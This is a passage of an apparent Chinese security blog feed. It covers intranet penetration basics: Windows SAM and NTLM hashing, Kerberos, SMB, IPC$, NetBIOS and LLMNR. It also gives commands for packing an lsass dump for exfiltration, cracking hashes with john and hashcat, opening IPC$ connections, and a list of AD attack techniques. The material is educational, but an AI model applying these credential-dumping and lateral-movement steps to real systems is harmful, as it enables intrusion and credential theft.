class="line">文件加密</span><br><span class="line">节点选择</span><br><span class="line">各种云盘</span><br><span class="line">Tips:</span><br><span class="line">内网大流量机器作为传输对象,如WSUS服务器、视频会议系统等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="文件打包-Makecab"><a href="#文件打包-Makecab" class="headerlink" title="文件打包 - Makecab"></a>文件打包 - Makecab</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.单文件打包压缩</span><br><span class="line">压缩: makecab lsass.dmp 1.zip</span><br><span class="line">解压: expand 1.zip 1.dmp</span><br><span class="line">2.多文件打包压缩</span><br><span class="line">压缩:</span><br><span class="line">dir &#x2F;b &gt; list.txt</span><br><span class="line">makecab &#x2F;f list.txt &#x2F;d maxdisksize&#x3D;102400</span><br><span class="line">&#x2F;f</span><br><span class="line">&#x2F;d maxdisksize&#x3D;&#x3D;102400 单位是字节,这里为1m</span><br><span class="line">解压:</span><br><span class="line">expand 1.cab -f:* c:\expand\</span><br><span class="line">c:\expand\目录必须存在</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="文件打包-7z"><a href="#文件打包-7z" class="headerlink" title="文件打包 -7z"></a>文件打包 -7z</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rar</span><br><span class="line">rar.exe a -r -v1m -padmin -m3 -x*.txt -ta c:\test.rar C:\test</span><br><span class="line">7z</span><br><span class="line">7z.exe a c:\xx.7z -ppass -mhe c:\test -v1m</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 hasdes@123 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习基础</title>
      <link href="2021/06/22/untitled/"/>
      <url>2021/06/22/untitled/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>现在网上内网渗透、域渗透文章很多,大多数人只知道如何进行操作获取全新,不知使用该技术的原理和该技术操<br>作影响Windows何种功能,Windows何种机制对内网渗透产生的影响,按照数个Windows系统的功能进行讲解,<br>完善内网渗透知识结构。</p><h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><p>SAM<br>Hash<br>Active Directory<br>Kerberos<br>SMB<br>IPC<br>NetBIOS<br>LLMNR<br>WMI<br>Windows Access Token<br>Windows网络认证<br>Windows本地认证流程<br>内网渗透流程<br>内网渗透常用工具</p><h4 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h4><p>SAM(安全账户管理器),SAM是用来存储Windows操作系统密码的数据库文件,为了避免明文密码泄漏,SAM文<br>件中保存的是明文密码经过一系列算法处理过的Hash值,被保存的Hash分为LM Hash、NTLMHash。在用户在<br>本地或远程登陆系统时,会将Hash值与SAM文件中保存的Hash值进行对比。在后期的Windows系统中,SAM文<br>件中被保存的密码Hash都被密钥SYSKEY加密。<br>SAM文件在磁盘中的位置在C:\windows\system32\config\sam<br>SAM文件在Windows系统启动后被系统锁定,无法进行移动和复制</p><h4 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h4><p>Windows系统为了保证用户明文密码不会被泄漏,将明文密码转换为Hash值进行身份验证,被保存在SAM或<br>ntds.dit中。</p><h5 id="Hash背景"><a href="#Hash背景" class="headerlink" title="Hash背景"></a>Hash背景</h5><p>1.LM Hash,在早期的Windows操作系统中将明文密码转换为LM Hash保存在SAM文件中,因为LM Hash使用<br>DES加密,密钥为硬编码,算法又存在缺陷,所以被废弃,为了保证系统兼容性可以自行开启。</p><p>2.NTLM Hash,在LM Hash算法被弃用时,NTLM Hash被用来进行Windows本地及远程身份验证的凭据,长度<br>为32bit、由数字和字母组成。Hash示例<br>冒号前半段为LM Hash,冒号后半段为NTLM Hash<br>aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42<br>net-NTLM Hash:<br>admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c78303100000000<br>00000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030</p><h5 id="Hash产生"><a href="#Hash产生" class="headerlink" title="Hash产生:"></a>Hash产生:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.LM Hash:</span><br><span class="line">1 admin1-ADMIN1(将密码转换为大写字母</span><br><span class="line">)</span><br><span class="line">2 ADMIN1-41444d494e31(16进制转换)</span><br><span class="line">3 41444d494e31-41444d494e310000000000000000(密码未到7位,在末尾补0,填充为14个字符,补16个0)</span><br><span class="line">4 41444d494e3100</span><br><span class="line">00000000000000(分为两组,各转换为2进制)</span><br><span class="line">5 1000001010001000100110101001001010011100011000100000000(⻓度不足56bit,左侧补0)</span><br><span class="line">6 01000001010001000100110101001001010011100011000100000000(再分为7bit一组,后加0)</span><br><span class="line">7 0100000 0</span><br><span class="line">8 1010001 0</span><br><span class="line">9 0001001 0</span><br><span class="line">10 1010100 0</span><br><span class="line">11 1001010 0</span><br><span class="line">12 0111000 0</span><br><span class="line">13 1100010 0</span><br><span class="line">14 0000000 0</span><br><span class="line">15 0100000010100010000100101010100010010100011100001100010000000000-40A212A89470C400(转换为16进</span><br><span class="line">制)</span><br><span class="line">16 0000000000000000</span><br><span class="line">17 将上面两组数字des加密</span><br><span class="line">18 KGS!@#$%-4b47532140232425(KGS!@#$%为LM Hash加密时DES加密的硬编码,转换为16进制)</span><br><span class="line">19 6C734076E7B827BFAAD3B435B51404EE(将两组des加密后的密文组合,得到LM Hash)注:如果密码不超过7字节,后面的一半是固定的,都为0,安全性降低,所以被弃用。</span><br></pre></td></tr></table></figure><h5 id="2-NTLM-Hash"><a href="#2-NTLM-Hash" class="headerlink" title="2.NTLM Hash:"></a>2.NTLM Hash:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.hex(16进制编码)</span><br><span class="line">2.Unicode编码</span><br><span class="line">3.md4加密</span><br><span class="line">1 admin1-61646d696e31(将明文转换为16进制编码)</span><br><span class="line">2 61646d696e31-610064006d0069006e003100(ASCII转Unicode)</span><br><span class="line">3 610064006d0069006e003100-74561893ea1e32f1fab1691c56f6c7a5(md4加密得到NTLM Hash)</span><br><span class="line">获取Hash方法</span><br><span class="line">1.使用卷影副本将SAM文件导出,配合SYSKEY利用mimikatz等工具获得NTLM Hash</span><br><span class="line">2.使用mimikatz等工具读取lsass.exe进程,获取Hash</span><br><span class="line">3.配合其他漏洞和手法获取net-NTLM Hash</span><br><span class="line">4.net-NTLM Hash可以使用Responder或Inveigh等工具获取</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="破解Hash"><a href="#破解Hash" class="headerlink" title="破解Hash"></a>破解Hash</h4><h5 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.john --format&#x3D;lm hash.txt</span><br><span class="line">2.hashcat -m 3000 -a 3 hash.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.john --format&#x3D;nt hash.txt</span><br><span class="line">2.hashcat -m 1000 -a 3 hash.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Net-NTLMv1"><a href="#Net-NTLMv1" class="headerlink" title="Net-NTLMv1"></a>Net-NTLMv1</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.john --format&#x3D;netntlm hash.txt</span><br><span class="line">2.hashcat -m 5500 -a 3 hash.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Net-NTLMv2"><a href="#Net-NTLMv2" class="headerlink" title="Net-NTLMv2"></a>Net-NTLMv2</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.john --format&#x3D;netntlmv2 hash.txt</span><br><span class="line">2.hashcat -m 5600 -a 3 hash.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>Active Directory,活动目录简称AD,是一个基于DNS并以树状的数据结构来组成网络服务存储了有关网络对象的<br>信息,并以此作为基础对目录信息进行合乎逻辑的分层组织,让管理员和用户能够轻松地查找和使用这些信息。常<br>网域都只有一个,在中型或大型的网络中,网域可能会有很多个,或是和其他公司或组织的AD相互链接。</p><h5 id="活动目录功能"><a href="#活动目录功能" class="headerlink" title="活动目录功能"></a>活动目录功能</h5><p>服务器及客户端计算机管理<br>用户服务<br>资源管理<br>桌面配置<br>应用系统支撑</p><h5 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h5><p>ntds.dit是AD中的数据库文件,它被保存在域控制器c:\windows\system32\ntds\NTDS.DIT位置。活动目录的数<br>据库文件(ntds.dit)包含有关活动目录域中所有对象的所有信息,其中包含所有域用户和计算机帐户的密码哈希值。该文件在所有域控制器之间自动同步,它只能被域管理员访问和修改。</p><h5 id="攻击活动目录"><a href="#攻击活动目录" class="headerlink" title="攻击活动目录"></a>攻击活动目录</h5><p>利用常规Web渗透进行横向渗透<br>常规Dump Hash后进行PTH,循环操作,直到获取Domain Admins<br>利用SYSVOL和组策略首选项(GPP)<br>MS14-068<br>利用VSS卷影副本拷贝ntds.dit<br>利用Responder等工具进行ARP<br>Netbios和LLMNR命名投毒<br>kerberoast(破解Ticket)<br>MS17-010</p><h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><p>Kerberos是一种网络认证协议,对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机/服<br>务器应用程序提供强大的认证服务。 它允许某实体在非安全网络环境下通信,向另一个实体以一种安全的方式证<br>明自己的身份。该认证过程的实现不依赖于主机操作系统的认证,无需基于主机地址的信任,不要求网络上所有主<br>机的物理安全,并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下, Kerberos 作为<br>一 种可信任的第三方认证服务,是通过传统的密码技术(如:共享密钥)执行认证服务的。</p><h5 id="协议内容"><a href="#协议内容" class="headerlink" title="协议内容"></a>协议内容</h5><p>AS:认证服务器<br>KDC:密钥分发中心<br>TGT:票据授权票据,票据的票据<br>TGS:票据授权服务器</p><h5 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h5><p>认证流程包含三种角色:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1.Client(客户端)</span><br><span class="line">2.Server(服务端)</span><br><span class="line">3.KDC(也就是参与认证的域控制器)</span><br><span class="line">4.AD(存储所有 client的白名单,只有存在于白名单的Client才能顺利申请到TGT)</span><br><span class="line">5.AS(为Client生成TGT的服务)</span><br><span class="line">6.TGS(为Client生成某个服务的 ticket)</span><br><span class="line">7.Session Key(会话密钥,只有Client和TGS知道,在Kerberos认证中至关重要)</span><br><span class="line">1 一、Client向KDC申请TGT</span><br><span class="line">2 1.Client以明文方式将用户名、IP地址发送给AS请求TGT</span><br><span class="line">3 2.KDC在ntds.dit中查找该账户</span><br><span class="line">4 3.如果找到,KDC随机生成一个Session Key,此时AS向Client发送两条消息</span><br><span class="line">5 (1)TGT(使用krbtgt NTLM Hash加密),内容包含:</span><br><span class="line">6 User Name</span><br><span class="line">7 Domain Name</span><br><span class="line">8 组成员资格</span><br><span class="line">9 TGS Name</span><br><span class="line">10 时间戳</span><br><span class="line">11 IP地址</span><br><span class="line">12 TGT的生命周期</span><br><span class="line">13 Session Key</span><br><span class="line">14 (2)另一条消息(使用Client申请TGT时使用的用户名对应的NTLM Hash加密),内容包含:15 TGS Name</span><br><span class="line">16 时间戳</span><br><span class="line">17 TGT的生命周期</span><br><span class="line">18 Session Key</span><br><span class="line">19 二.Client通过获得TGT向KDC申请用于访问Server的Ticket</span><br><span class="line">20 1.Client向TGS发送三条消息</span><br><span class="line">21 (1)Authenticator(使用Session Key加密),内容包含:</span><br><span class="line">22 User Name</span><br><span class="line">23 时间戳</span><br><span class="line">24 需要访问的服务名称</span><br><span class="line">25 (2)TGT</span><br><span class="line">26 2.KDC使用Ktbtgt NTLM Hash对TGT解密,获取Client信息和Session Key</span><br><span class="line">27 3.使用Session Key对Client发来对Authenticator信息解密,对比Client信息,相同则认证通过</span><br><span class="line">28 4.TGS向Client发送两条消息</span><br><span class="line">29 (1)TGS生成Client需要访问服务的Ticket发送给Client,Ticket使用目标服务帐户的NTLM Hash加密。</span><br><span class="line">30 (2)使用Session Key加密的Server Session Key,内容包含:</span><br><span class="line">31 Server Name</span><br><span class="line">32 时间戳</span><br><span class="line">33 Server Session Key</span><br><span class="line">34 5.Client收到消息后,使用Session Key解密获得Server Session Key</span><br><span class="line">35 三.Client最终向为了Server对自己的认证向其提交Ticket</span><br><span class="line">36 1.使用Server Session Key加密向Server发送Authenticator信息和TGS颁发的Server Ticket,内容包含:</span><br><span class="line">37 User Name</span><br><span class="line">38 时间戳</span><br><span class="line">39 2.Server使用密钥解密Ticket,获得Server Session Key,使用Server Session Key解密Authenticator信息,</span><br><span class="line">对比Authenticator信息中的Client信息和Ticket中的Client信息对比,将Authenticator信息的时间戳和Ticket的</span><br><span class="line">时间戳是否相同(误差2min)</span><br><span class="line">40 3.Server使用Server Session Key加密Authenticator信息,内容包含:</span><br><span class="line">41 ID</span><br><span class="line">42 时间戳</span><br><span class="line">43 4.Client使用缓存中的用Server Session Key解密Authenticator信息,得到访问该访问需要携带的ID和时间戳。</span><br><span class="line">44 5.认证完成,只需要使用申请的Service Ticket就可以正常访问服务。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><p>SMB(Server Message Block)被称为服务器消息块,又叫网络文件共享系统(CIFS)。在Windows2000中,SMB除<br>了基于NBT实现,还可以直接通过445端又实现。</p><h5 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h5><p>使网络上的机器能够共享计算机文件、打印机、串行端又和通讯等资源。</p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>CIFS消息一般使用NetBIOS或TCP协议发送,分别使用不同的端又139或445,当前倾向于使用445端又。<br>直接运行在 TCP 上 port 445<br>通过使用 NetBIOS API<br>基于 UDP ports 137, 138 &amp; TCP ports 137, 139<br>基于一些传统协议,例如 NBF</p><h5 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h5><p>1.SMB 1.0 没有数字签名功能<br>2.SMB 2.0<br>3.SMB 2.14.SMB 3.0</p><h4 id="IPC-进程间通信"><a href="#IPC-进程间通信" class="headerlink" title="IPC(进程间通信)"></a>IPC(进程间通信)</h4><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>指至少两个进程或线程间传送数据或信号的一些技术或方法。</p><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>信息共享:Web服务器,通过网页浏览器使用进程间通信来共享web文件(网页等)和多媒体<br>加速:维基百科使用通过进程间通信进行交流的多服务器来满足用户的请求<br>模块化<br>私有权分离</p><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><h5 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h5><h6 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h6><p>IPC$是共享“命名管道”的资源,为了让进程间通信而开放的命名管道,通过提供可信任的用户名和又令,连接双<br>方可以建立安全的通道并以此通道进行加密数据的交换,从而实现对远程计算机的访问,从NT/2000开始使用。<br>IPC$在同一时间内,两个IP之间只允许建立一个连接。<br>NT/2000在提供了 ipc$ 功能的同时,在初次安装系统时还打开了默认共享,即所有的逻辑共享(c , d ,e$……)和系统<br>目录winnt或管理员目录(admin$)共享。</p><h6 id="IPC-主要使用"><a href="#IPC-主要使用" class="headerlink" title="IPC$主要使用"></a>IPC$主要使用</h6><h6 id="IPC空连接"><a href="#IPC空连接" class="headerlink" title="IPC空连接"></a>IPC空连接</h6><p>对于NT,在默认安全设置下,借助空连接可以列举目标主机上的用户和共享,访问everyone权限的共享,访问小<br>部分注册表等;在WIndows Server 2000及以后作用更小,因为在Windows 2000 和以后版本中默认只有管理员有<br>权从网络访问到注册表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常用命令</span><br><span class="line">建立IPC$空连接:net use \\192.168.1.101\ipc$ &quot;&quot; &#x2F;user:&quot;domain\username&quot;</span><br><span class="line">建立IPC$非空连接:net use \\192.168.1.101\ipc$ &quot;password&quot; &#x2F;user:&quot;domain\username&quot;</span><br><span class="line">删除IPC$连接:net use \\192.168.1.101\ipc$ &#x2F;del</span><br><span class="line">已经建立IPC$连接并且有权限,将目标C盘映射到本地Z盘:net use z: \\192.168.1.101\c$</span><br><span class="line">删除映射:net use z: &#x2F;del</span><br><span class="line">关闭IPC默认共享:net use ipc$ &#x2F;del</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h6><p>1.现在绝大多数的Windows操作系统默认策略不允许来自远程网络验证的空密码,所以IPC空连接已经被废弃。</p><p>2.如果远程服务端未开启139、445端又,无法使用IPC$进行连接。</p><h4 id="NETBIOS"><a href="#NETBIOS" class="headerlink" title="NETBIOS"></a>NETBIOS</h4><h5 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h5><p>NETBIOS(网络基本输入输出系统),严格讲不属于网络协议,NETBIOS是应用程序接又(API),早期使用<br>NetBIOS Frames(NBF)协议进行运作,是一种非路由网络协议,位于传输层;后期NetBIOS over<br>TCP/IP(缩写为NBT、NetBT)出现,使之可以连接到TCP/IP,是一种网络协议,位于会话层。基于<br>NETBIOS协议广播获得计算机名称——解析为相应IP地址,WindowsNT以后的所有操作系统上均可用,不<br>支持IPV6</p><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><h5 id="NETBIOS提供三种服务"><a href="#NETBIOS提供三种服务" class="headerlink" title="NETBIOS提供三种服务"></a>NETBIOS提供三种服务</h5><p>NetBIOS-NS(名称服务):为了启动会话和分发数据报,程序需要使用Name Server注册NETBIOS名称,<br>可以告诉其他应用程序提供什么服务,默认监听UDP137端又,也可以使用TCP 137端又。<br>Datagram distribution service(数据报分发服务):无连接,负责错误检测和恢复,默认在UDP 138端又。<br>Session Server(会话服务):允许两台计算机建立连接,默认在TCP 139端又。</p><h5 id="利用NETBIOS发现主机"><a href="#利用NETBIOS发现主机" class="headerlink" title="利用NETBIOS发现主机"></a>利用NETBIOS发现主机</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.nbtstat(Windows自带命令)</span><br><span class="line">获取目标主机MAC地址</span><br><span class="line">nbtstat -A 192.168.100.200</span><br><span class="line">2.nbtscan</span><br><span class="line">扫描指定网段的主机名和网络开放共享</span><br><span class="line">nbtscan.exe 192.168.100.1&#x2F;24</span><br><span class="line">SHARING表示开放,DC 表示可能是域控</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="LLMNR简介"><a href="#LLMNR简介" class="headerlink" title="LLMNR简介"></a>LLMNR简介</h4><p>LLMNR是链路本地多播名称解析,当局域网中的DNS服务器不可用时,可以使用LLMNR解析本地网段上<br>机器名称,只有WindowsVista和更高版本才支持LLMNR,支持IPV6</p><h5 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h5><p>通过UDP发送到组播地址224.0.0.252:5355,查询主机名对应的IP,使用的是DNS格式数据包,数据包会被<br>限制在本地子网中。<br>本地子网中所有支持LLMNR的主机在受到查询请求时,会对比自己的主机名是否相同,不同就丢弃,相同<br>就发送包含自己IP的单播信息给查询主机。</p><ol><li>主机在内部名称缓存中查询名称</li><li>在主DNS查询名称</li><li>在备用DNS查询名称</li><li>使用LLMNR查询名称</li></ol><h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><p>WMI(Windows管理规范),由一系列对Windows Driver Model的扩展组成,它通过仪器组件提供信息和通知,提<br>供了一个操作系统的接又。在渗透测试过程中,攻击者往往使用脚本通过WMI接又完成对Windows操作系统的操<br>作,远程WMI连接通过DCOM进行。例如:WMIC、Invoke-WmiCommand、Invoke-WMIMethod等。另一种方<br>法是使用Windows远程管理(WinRM)。</p><h4 id="Windows-Access-Token"><a href="#Windows-Access-Token" class="headerlink" title="Windows Access Token"></a>Windows Access Token</h4><h5 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h5><p>Windows Access Token(访问令牌),它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机<br>后, 都会生成一个Access Token,这个Token在用户创建进程或者线程时会被使用,不断的拷贝,这也就解释了A<br>用户创建一个进程而该进程没有B用户的权限。当用户注销后,系统将会使主令牌切换为模拟令牌,不会将令牌清<br>除,只有在重启机器后才会清除<br>Access Token分为两种(主令牌、模拟令牌)</p><h5 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h5><p>用户帐户的安全标识符(SID)<br>用户所属的组的SID<br>用于标识当前登录会话的登录SID<br>用户或用户组所拥有的权限列表<br>所有者SID<br>主要组的SID<br>访问控制列表<br>访问令牌的来源<br>令牌是主要令牌还是模拟令牌<br>限制SID的可选列表<br>目前的模拟等级<br>其他统计数据</p><h5 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h5><p>安全标识符是一个唯一的字符串,它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定<br>列表,例如 Everyone这种已经内置的账户,默认拥有固定的SID。SID表现形式:<br>域SID-用户ID<br>计算机SID-用户ID</p><h4 id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h4><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己<br>指定了 Token, LSA会用该Token, 否则就用父进程Token的一份拷贝。<br>Windows网络认证</p><h5 id="1-工作组"><a href="#1-工作组" class="headerlink" title="1.工作组"></a>1.工作组</h5><h5 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h5><p>工作组是指数台计算机在同一个内网中,在逻辑上都属于工作组,但是在工作组中的机器之间相互没有信任关系,<br>每台机器的账号密码只是保存在自己的SAM文件中。那就意味着如果需要共享资源只能新建一个账号并指定相关<br>资源授予该账号权限才可以完成共享。早期利用SMB协议在内网中传输明文又令,后为了安全出现LM<br>Challenge/Response 验证机制,再之后LM Challenge/Response 验证机制因为安全性问题,从Windows Vista /<br>Server 2008开始LM就被弃用,改用Windows NT挑战/响应验证机制,常被人称为NTLM,现在被更新到<br>NTLMv2<br>历史版本。<br>NTLMv1:服务器通过发送一个8字节的随机数(挑战)来验证客户端,客户端返回两个24字节Hash进行计算并返<br>回计算结果。<br>NTLMv2:它通过加强协议来抵御许多欺骗攻击,并增加服务器向客户端进行身份验证的能力,从而增强了NTLM<br>的安全性。服务器通过发送一个16字节的HMAC - MD5随机数(挑战)来验证客户端。</p><h5 id="工作流程-1"><a href="#工作流程-1" class="headerlink" title="工作流程"></a>工作流程</h5><h5 id="Client-客户端-、Server-服务端"><a href="#Client-客户端-、Server-服务端" class="headerlink" title="Client(客户端)、Server(服务端)"></a>Client(客户端)、Server(服务端)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[1] 协商</span><br><span class="line">Clint向Server发送消息,确定协议版本</span><br><span class="line">[2] 质询</span><br><span class="line">Client向Server发送用户名消息作为请求</span><br><span class="line">Server收到请求,验证是否存在Client发来的用户名,如果存在,生成16位的随机数(Challenge)发送给</span><br><span class="line">Cilent,并使用SAM中查询用户名对应的NTLM Hash加密Chanllenge,生成Net-NTLM Hash存放在内存</span><br><span class="line">中。</span><br><span class="line">Client使用发送的用户名对应的NTLM Hash加密Challenge,将结果(Response)发送给Server</span><br><span class="line">[3] 验证</span><br><span class="line">Server收到Client发送的Response,将接收的Response与Net-NTLM Hash进行比较,如果相同,则认证通</span><br><span class="line">过。</span><br><span class="line">注:每次生成的16字节的Challenge都不同,保证的安全性。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h4><p>Windows Logon Process(即 winlogon.exe),Winlogon 是负责处理安全相关的用户交互界面的组件。<br>Winlogon的工作包括加载其他用户身份安全组件、提供图形化的登录界面,以及创建用户会话。<br>LSASS(本地安全认证子系统服务)用于微软Windows系统的安全机制。它负责Windows系统安全策略。它负<br>责用户在本地验证或远程登陆时验证用户身份,管理用户密码变更,并产生访问日志。用户注销、重启、锁屏后,操作系统会让winlogon显示图形化登录界面,也就是输入框,接收域名、用户名、密<br>码后交给lsass进程,将明文密码加密成NTLM Hash,对SAM数据库比较认证,相同则认证成功。</p><h5 id="内网渗透常用端口"><a href="#内网渗透常用端口" class="headerlink" title="内网渗透常用端口"></a>内网渗透常用端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">53</span><br><span class="line">DNS服务,在使用中需要用到TCP&#x2F;UDP 53端又,AD域的核心就是DNS服务器,AD通过DNS服务器定位资</span><br><span class="line">源</span><br><span class="line">88</span><br><span class="line">Kerberos服务,在使用中需要用到TCP&#x2F;UDP 88端又,Kerberos密钥分发中心(KDC) 在该端又上侦听Ticket</span><br><span class="line">请求</span><br><span class="line">135</span><br><span class="line">135端又主要用于使用RPC协议并提供DCOM服务。</span><br><span class="line">137</span><br><span 